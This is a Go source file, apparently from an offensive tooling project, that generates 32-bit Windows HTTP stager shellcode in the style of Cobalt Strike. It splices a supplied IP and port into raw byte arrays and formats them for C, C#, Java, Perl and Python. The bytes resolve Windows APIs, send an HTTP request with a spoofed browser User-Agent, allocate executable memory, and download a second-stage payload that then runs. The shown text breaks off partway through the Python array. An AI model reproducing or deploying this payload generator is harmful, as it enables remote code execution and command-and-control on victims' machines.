package service

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"math/rand"
	"strconv"
	"time"
)

type CS_Shellcode struct {
	C      string
	Cs     string
	Java   string
	Perl   string
	Python string
	Ruby   string
}

func CS_Http_Shellcode32(ip string, port string) CS_Shellcode {
	port_int, _ := strconv.Atoi(port)
	port_byte := Port_byte_rec_IntToBytes(port_int)
	ip_byte := []byte(ip)
	head := []byte{0xfc, 0xe8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64, 0x8b, 0x52, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf0, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x42, 0x3c, 0x01, 0xd0, 0x8b, 0x40, 0x78, 0x85, 0xc0, 0x74, 0x4a, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x8b, 0x58, 0x20, 0x01, 0xd3, 0xe3, 0x3c, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0x31, 0xc0, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf4, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe2, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x58, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x86, 0x5d, 0x68, 0x6e, 0x65, 0x74, 0x00, 0x68, 0x77, 0x69, 0x6e, 0x69, 0x54, 0x68, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x57, 0x57, 0x57, 0x57, 0x68, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0x84, 0x00, 0x00, 0x00, 0x5b, 0x31, 0xc9, 0x51, 0x51, 0x6a, 0x03, 0x51, 0x51, 0x68}
	C := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x70, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xc3, 0x01, 0x00, 0x00, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39, 0xc7, 0x74, 0xb7, 0x31, 0xff, 0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0xe8, 0x8b, 0xff, 0xff, 0xff, 0x2f, 0x47, 0x62, 0x49, 0x6a, 0x00, 0x27, 0xdf, 0x78, 0xc9, 0x4f, 0x00, 0x9b, 0x19, 0x5a, 0x82, 0xa7, 0xb7, 0x4b, 0x07, 0x39, 0x2d, 0xbb, 0x76, 0xbd, 0x96, 0x1e, 0x13, 0xa5, 0xde, 0xc7, 0xbc, 0xd1, 0x44, 0xcc, 0x02, 0xd3, 0xf9, 0x44, 0x79, 0xb0, 0xaf, 0x00, 0x88, 0x2d, 0x7b, 0x5f, 0xa5, 0x3e, 0xb9, 0x11, 0x00, 0xeb, 0x61, 0x5f, 0x43, 0x11, 0x95, 0x09, 0xbd, 0x6f, 0x29, 0xcf, 0xd2, 0xfa, 0xeb, 0x10, 0xa8, 0xd1, 0x73, 0x84, 0x25, 0x31, 0x83, 0xe0, 0xf1, 0x91, 0x65, 0x36, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x31, 0x30, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x32, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x36, 0x34, 0x3b, 0x20, 0x78, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x36, 0x2e, 0x30, 0x3b, 0x20, 0x41, 0x76, 0x61, 0x6e, 0x74, 0x20, 0x42, 0x72, 0x6f, 0x77, 0x73, 0x65, 0x72, 0x29, 0x0d, 0x0a, 0x00, 0x13, 0x7e, 0x9d, 0x0e, 0xba, 0x67, 0xb3, 0x91, 0x0a, 0x0d, 0xee, 0x2e, 0xaf, 0xb9, 0x47, 0xe8, 0x18, 0x74, 0x01, 0x90, 0x52, 0xa6, 0xf3, 0xeb, 0xbc, 0xd6, 0xf1, 0x4c, 0x74, 0x82, 0x05, 0x6d, 0x85, 0xc5, 0x05, 0x9d, 0xd3, 0xbd, 0xd3, 0x52, 0x41, 0xa5, 0x65, 0x38, 0x7a, 0x4c, 0x9d, 0x00, 0xb5, 0xdc, 0x90, 0x26, 0x24, 0xba, 0x57, 0x7b, 0xae, 0xd1, 0xed, 0xa7, 0xa7, 0xf9, 0x7a, 0x99, 0x5a, 0x14, 0x6a, 0xa5, 0x43, 0xfc, 0x37, 0xf6, 0x41, 0x20, 0x58, 0x86, 0x5a, 0xf6, 0x64, 0x7c, 0x6e, 0xef, 0xc6, 0x17, 0x13, 0x19, 0xf2, 0x3d, 0x70, 0x57, 0xaf, 0x14, 0xa8, 0x0b, 0x7f, 0xae, 0x54, 0x3d, 0xa9, 0xc9, 0x5a, 0x4b, 0xca, 0xe5, 0x4a, 0x3a, 0xfd, 0x30, 0x5a, 0x8a, 0x5f, 0xb0, 0xeb, 0x4d, 0x3f, 0x34, 0xea, 0xcb, 0x90, 0xd6, 0xd4, 0x9d, 0xe8, 0x0f, 0xe6, 0x1f, 0x65, 0x0d, 0x86, 0x2c, 0xd9, 0x1e, 0x88, 0x59, 0x73, 0x0a, 0x1e, 0x8d, 0x56, 0xb1, 0xcc, 0x2e, 0x5c, 0x55, 0xc1, 0x35, 0x53, 0x8a, 0xb6, 0x7b, 0x77, 0xb1, 0xce, 0x8f, 0x19, 0xa4, 0x4e, 0x63, 0xe2, 0xcc, 0x7a, 0x44, 0x56, 0x69, 0x4c, 0x16, 0x68, 0xf3, 0x4b, 0x99, 0xea, 0x12, 0xb3, 0x09, 0xab, 0xb9, 0x9e, 0x10, 0x0c, 0x44, 0xb6, 0xab, 0x4a, 0x41, 0x6e, 0x16, 0xa0, 0xf8, 0x58, 0x17, 0x7b, 0x4d, 0xc4, 0x2e, 0x64, 0xb0, 0x01, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0xa9, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		C = C + fmt.Sprintf("0x%02x,", v)
	}
	Cs := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x70, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xc3, 0x01, 0x00, 0x00, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39, 0xc7, 0x74, 0xb7, 0x31, 0xff, 0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0xe8, 0x8b, 0xff, 0xff, 0xff, 0x2f, 0x49, 0x68, 0x75, 0x36, 0x00, 0x22, 0xd3, 0x1a, 0x9d, 0x30, 0x59, 0xa0, 0xb1, 0xdf, 0xce, 0x3c, 0x71, 0x72, 0x71, 0xaf, 0x6c, 0x35, 0xdc, 0x0c, 0x25, 0x52, 0x44, 0xd6, 0x1f, 0x51, 0xb3, 0x8d, 0xb6, 0x10, 0xfc, 0xdc, 0xa4, 0xb5, 0xaa, 0xa9, 0x0b, 0x6d, 0x2b, 0xa5, 0xf8, 0xc0, 0x31, 0x65, 0xbf, 0x1a, 0x02, 0xd4, 0xce, 0xbd, 0xa9, 0xa1, 0x1d, 0xd5, 0xb7, 0xe3, 0xcb, 0x94, 0x5d, 0x7c, 0xbc, 0x5f, 0xd7, 0x49, 0xd4, 0x06, 0x0a, 0xf4, 0x14, 0x43, 0x6d, 0x96, 0x59, 0x7d, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x36, 0x34, 0x3b, 0x20, 0x78, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x29, 0x0d, 0x0a, 0x00, 0x62, 0x4e, 0x88, 0xec, 0x95, 0x48, 0x5c, 0x54, 0xf8, 0x68, 0xf1, 0x14, 0x53, 0x11, 0xf4, 0xd3, 0x88, 0xc1, 0x82, 0x82, 0x36, 0x82, 0x69, 0xc7, 0x4a, 0x77, 0xf1, 0xe3, 0x6d, 0xdf, 0xb0, 0x75, 0x73, 0x20, 0x3e, 0x4d, 0xca, 0x29, 0xed, 0x10, 0xa0, 0x11, 0x66, 0xa0, 0x7a, 0x60, 0x97, 0x22, 0xcb, 0x9b, 0xe6, 0xa8, 0xde, 0x5c, 0x8b, 0x2f, 0x27, 0x3f, 0xce, 0xa1, 0xfb, 0xf5, 0xbb, 0x96, 0x52, 0x8c, 0xad, 0x29, 0xcc, 0x4c, 0xfe, 0x6e, 0x29, 0x9a, 0x23, 0x32, 0x44, 0x6a, 0x62, 0x7b, 0x81, 0xcc, 0xcd, 0x2f, 0xb1, 0x72, 0xbc, 0x99, 0x1e, 0x0b, 0xec, 0x32, 0xdf, 0x70, 0x64, 0x3c, 0xf0, 0x0c, 0xfc, 0xd3, 0xf0, 0x0c, 0x15, 0xaf, 0x98, 0x5d, 0xb8, 0x97, 0xf9, 0x81, 0x98, 0x23, 0xa4, 0x63, 0x6b, 0xf1, 0x3b, 0xe9, 0x04, 0xc8, 0x9d, 0xee, 0x97, 0x81, 0xbb, 0x5c, 0xe6, 0x3f, 0xe6, 0x1b, 0x17, 0xcd, 0x04, 0x18, 0x07, 0x8a, 0xad, 0x23, 0xf0, 0x21, 0x18, 0x12, 0xf0, 0x4b, 0xf5, 0x49, 0xbf, 0xf3, 0x69, 0xb0, 0xcc, 0x39, 0x55, 0x7d, 0xa7, 0x52, 0x2b, 0xa8, 0x32, 0xe5, 0xf7, 0xd8, 0x96, 0x7c, 0xe3, 0x20, 0xd6, 0xe6, 0x4f, 0xfd, 0x14, 0x00, 0x7f, 0x04, 0xca, 0xf6, 0xc8, 0x69, 0xb9, 0x8d, 0x70, 0xdd, 0x2d, 0xa1, 0xbc, 0x3e, 0x10, 0xe6, 0x07, 0xd7, 0x0e, 0xee, 0x37, 0x6f, 0xbe, 0x94, 0x45, 0xb5, 0xf0, 0x64, 0x46, 0x31, 0xd8, 0x8c, 0xe2, 0x12, 0x4f, 0x73, 0x9d, 0xa4, 0xa8, 0x4f, 0x0b, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0xa9, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Cs = Cs + fmt.Sprintf("0x%02x,", v)
	}
	Java := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x70, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xc3, 0x01, 0x00, 0x00, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39, 0xc7, 0x74, 0xb7, 0x31, 0xff, 0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0xe8, 0x8b, 0xff, 0xff, 0xff, 0x2f, 0x72, 0x38, 0x70, 0x42, 0x00, 0xcc, 0x9a, 0xb9, 0xce, 0x57, 0x32, 0x3d, 0xd1, 0x16, 0x2f, 0x4a, 0x7c, 0x7c, 0x77, 0x70, 0xd8, 0x22, 0xf7, 0x83, 0x03, 0x35, 0x87, 0x78, 0x15, 0x86, 0x47, 0x94, 0x77, 0x91, 0xbb, 0xbf, 0xea, 0x8c, 0xd8, 0x94, 0xc5, 0xcc, 0xcb, 0x00, 0x1d, 0x39, 0xed, 0x6b, 0x8b, 0x8b, 0x54, 0xaa, 0xe5, 0xc5, 0x33, 0x50, 0x0e, 0xc4, 0x05, 0xc4, 0xd3, 0x96, 0x75, 0x27, 0xd1, 0x8f, 0x10, 0x0a, 0xf2, 0x8b, 0xdd, 0xa1, 0x7c, 0xfb, 0x21, 0x99, 0xc5, 0x24, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x57, 0x4f, 0x57, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x41, 0x76, 0x61, 0x6e, 0x74, 0x20, 0x42, 0x72, 0x6f, 0x77, 0x73, 0x65, 0x72, 0x29, 0x0d, 0x0a, 0x00, 0xc5, 0xba, 0xe4, 0xf3, 0x3d, 0x35, 0x0a, 0x39, 0x44, 0xb3, 0x8f, 0xf3, 0x65, 0xd7, 0xbd, 0x20, 0x18, 0x81, 0xb2, 0x0e, 0x9e, 0x4d, 0x39, 0x10, 0x0a, 0x66, 0xe4, 0x31, 0x09, 0x03, 0xf5, 0x8f, 0xf0, 0x8a, 0x7c, 0x14, 0x97, 0x39, 0x28, 0x62, 0x39, 0xab, 0xe7, 0x8b, 0x89, 0xd0, 0x7a, 0xe9, 0xf9, 0x97, 0xfb, 0x74, 0x1f, 0x8f, 0xb7, 0x32, 0x43, 0xf1, 0x6f, 0x3c, 0x7c, 0x48, 0x62, 0xfa, 0x4a, 0x51, 0x03, 0x03, 0x06, 0xce, 0x41, 0xb3, 0x34, 0x1d, 0x4d, 0x5a, 0xe9, 0x73, 0x80, 0x49, 0xf8, 0xc9, 0x56, 0x07, 0xc0, 0x84, 0x67, 0x38, 0x40, 0x24, 0xb1, 0x90, 0x71, 0xad, 0x75, 0x20, 0x1f, 0x17, 0x8d, 0x38, 0x52, 0x18, 0x8c, 0x94, 0xbb, 0x31, 0x9f, 0x4b, 0x38, 0x2a, 0x9f, 0x9e, 0x45, 0x9a, 0xcd, 0xe8, 0x2a, 0xdb, 0xc6, 0xbf, 0x01, 0x03, 0x45, 0x11, 0xe8, 0xda, 0xe8, 0x68, 0x52, 0x3c, 0xc3, 0xfc, 0xcc, 0x69, 0x33, 0xa1, 0x6d, 0xc9, 0x39, 0xce, 0xbc, 0x52, 0xcb, 0xab, 0x1d, 0x5d, 0xe5, 0xb2, 0x30, 0xa8, 0xc8, 0x06, 0xae, 0x01, 0xaa, 0x17, 0x03, 0x0c, 0x53, 0x4b, 0x16, 0x16, 0xa3, 0x8a, 0x0c, 0xcd, 0xc7, 0xdf, 0xd3, 0xaa, 0xc9, 0x45, 0x74, 0x76, 0xbc, 0x3a, 0xdd, 0x47, 0xd5, 0xa5, 0x35, 0x5d, 0xab, 0x36, 0x19, 0x4d, 0xb0, 0xd7, 0x00, 0xe3, 0x2b, 0x7b, 0xef, 0x45, 0xc7, 0x98, 0xfc, 0x4b, 0x7e, 0x78, 0x1b, 0xb9, 0xd0, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0xa9, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Java = Java + fmt.Sprintf("0x%02x,", v)
	}
	Perl := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x70, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xc3, 0x01, 0x00, 0x00, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39, 0xc7, 0x74, 0xb7, 0x31, 0xff, 0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0xe8, 0x8b, 0xff, 0xff, 0xff, 0x2f, 0x76, 0x5a, 0x56, 0x36, 0x00, 0x2a, 0x23, 0x9a, 0x3e, 0x33, 0x5f, 0xe8, 0x7d, 0x0c, 0x08, 0x1d, 0x19, 0x44, 0xc5, 0x7b, 0x71, 0xa4, 0x16, 0xf8, 0x98, 0x99, 0x7a, 0x7a, 0x15, 0x35, 0x59, 0x50, 0x37, 0xaf, 0x1d, 0x61, 0x1b, 0x2e, 0xb6, 0x1d, 0x16, 0x23, 0xd1, 0xc4, 0xe3, 0x96, 0x7c, 0x76, 0x9f, 0x19, 0xcc, 0x55, 0x43, 0x33, 0x07, 0xb0, 0xbe, 0xb8, 0x17, 0xeb, 0x39, 0xa8, 0x51, 0xa3, 0xdf, 0x30, 0xe9, 0xa9, 0xd0, 0x9e, 0x9b, 0xe9, 0x12, 0x96, 0x3d, 0xe3, 0x04, 0xfa, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x42, 0x4f, 0x49, 0x45, 0x39, 0x3b, 0x4e, 0x4c, 0x4e, 0x4c, 0x29, 0x0d, 0x0a, 0x00, 0xac, 0x12, 0x69, 0xad, 0x68, 0xbb, 0x58, 0xa0, 0x4e, 0xc8, 0x98, 0xb3, 0xe3, 0xa8, 0x34, 0xd9, 0x67, 0x95, 0x4a, 0xba, 0x77, 0x94, 0xe2, 0x49, 0x86, 0x0a, 0xa3, 0x0f, 0xe6, 0xee, 0x45, 0x56, 0xd9, 0xef, 0x39, 0x64, 0xc3, 0xa0, 0x73, 0x63, 0x08, 0x09, 0xa9, 0xb4, 0x55, 0xc0, 0x9d, 0x3a, 0xc6, 0x92, 0xe1, 0xf6, 0xda, 0x98, 0x4c, 0xab, 0x33, 0x79, 0x53, 0x0c, 0xf2, 0x1d, 0xce, 0xa8, 0x82, 0x74, 0xf5, 0x9d, 0x05, 0x5a, 0xe3, 0xe7, 0x03, 0xb8, 0x79, 0x29, 0x8b, 0x50, 0x9f, 0x75, 0xb1, 0x88, 0x90, 0x60, 0xe9, 0x5c, 0x8c, 0x6e, 0xa6, 0xe3, 0xde, 0x58, 0x50, 0x52, 0xd4, 0x95, 0x17, 0x0a, 0x02, 0x6f, 0x93, 0xea, 0x6c, 0x19, 0xef, 0xd5, 0x8b, 0x5a, 0x47, 0x7c, 0xe5, 0x5f, 0x4b, 0xfa, 0xf4, 0xee, 0x57, 0x03, 0xfe, 0x6f, 0x24, 0x40, 0xc0, 0xd1, 0xb5, 0x2d, 0x66, 0xde, 0x10, 0x4b, 0x79, 0x15, 0xbd, 0x83, 0xfa, 0x02, 0xda, 0x19, 0xa5, 0x89, 0x55, 0x71, 0x7a, 0xee, 0xe3, 0x98, 0x20, 0x88, 0xb8, 0x3c, 0x02, 0x27, 0xa2, 0xb0, 0x65, 0x59, 0x9a, 0x7d, 0x6e, 0x11, 0x3e, 0x63, 0x7b, 0x1c, 0xeb, 0xf2, 0x3d, 0x39, 0x67, 0xfc, 0x27, 0x80, 0xf2, 0x64, 0x85, 0x94, 0x5c, 0x5b, 0x61, 0x92, 0xad, 0x06, 0x90, 0x3d, 0x99, 0xb4, 0xc9, 0x01, 0x21, 0x06, 0xc3, 0x1d, 0x4a, 0xc8, 0x0b, 0xb6, 0xc3, 0x15, 0x41, 0x6c, 0xbf, 0x6d, 0x08, 0x9b, 0x4a, 0x64, 0xae, 0xf3, 0xd1, 0xa5, 0xb9, 0xcb, 0xa1, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0xa9, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Perl = Perl + fmt.Sprintf("0x%02x,", v)
	}
	Python := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x70, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xc3, 0x01, 0x00, 0x00, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 